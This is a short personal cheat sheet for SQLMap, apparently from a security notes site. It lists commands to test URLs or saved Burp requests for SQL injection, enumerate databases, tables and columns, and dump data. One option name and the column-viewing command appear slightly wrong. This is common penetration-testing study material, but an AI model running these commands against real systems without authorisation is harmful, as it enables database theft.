---
tags:
  - security
  - sqli
  - web
title: SQLMap
date: 2024-01-28 14:15:56 -0600
updated: 2024-03-29 23:31:52 -0500
---

````bash
# Extended Help
sqlmap -hh
````

#### Test Website for Vulnerability

````bash
# Increase Aggressiveness of Scan
sqlmap -u "<URL>" --level=5 --risk=3

sqlmap -r <request-file> --string="<text-if-query-true>"

# POST Request
sqlmap -u "<URL>" --data="user=name&password=pass" -p "user,password"
````

Sometimes this might not work in that case we need to specify the fields that need to be tested
Burp Suite - Repeater - Request (Replace the payload values with `*`  
e.g.  `username=*&password=*` : Save as file

````bash
sqlmap -r <request-file>
````

#### Retrieve Database Names

````bash
sqlmap -u <URL> --dbs

# Return DB that is currently used
sqlmap -u <URL> --current-dbs
````

#### All Tables from Database

````bash
sqlmap -u <URL> -D <db-name> --tables
````

#### Columns from Table

````bash
sqlmap -u <URL> -D <db-name> -T <table-name> --columns
````

#### View Data from Column

````bash
sqlmap -u <URL> -D <db-name> -T <table-name> -C <column-name>
````

**Flags**  
`-u URL`: Target URL  
`--level=5`: Through Scan (Default : 1)  
`--risk=3`: Risk Level (Default : 1)  
`-r filename`: Provide the request file  
`--random-agent`: Request blocked by firewall  
`--dump`: Exploit Vulnerability Save result to file

`--string "string"`: String present on result page (Required for Blind Injection)  
`--dbms=dbms-name`: Pass Database Type (MySQL, PostgreSQL, etc.)

`--technique` : BEUSTQ  
`B`: Boolean-based blind  
`E`: Error-based  
`U`: Union query-based  
`S`: Stacked queries  
`T`: Time-based blind  
`Q`: Inline queries
